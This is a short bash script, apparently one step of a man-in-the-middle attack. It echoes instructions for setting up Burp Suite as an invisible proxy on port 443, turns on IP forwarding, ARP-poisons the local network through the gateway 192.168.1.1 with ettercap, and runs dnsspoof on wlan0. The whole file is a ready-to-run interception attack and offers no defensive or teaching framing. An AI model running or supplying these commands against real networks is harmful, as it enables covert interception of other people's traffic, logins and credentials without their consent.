#!/bin/bash

echo "2. Time to Configure BurpSuite proxy:


Click on the proxy tab and then click on the options sub-tab.
Click the add button and type '443' for the bind port.
Select the all interfaces radio button.
Click on the request handling tab and check the invisible proxy support box."

sleep 5


echo 1 > /proc/sys/net/ipv4/ip_forward
ettercap -i wlan0 -T -q -M ARP ///192.168.1.1///&

sudo dnsspoof -i wlan0
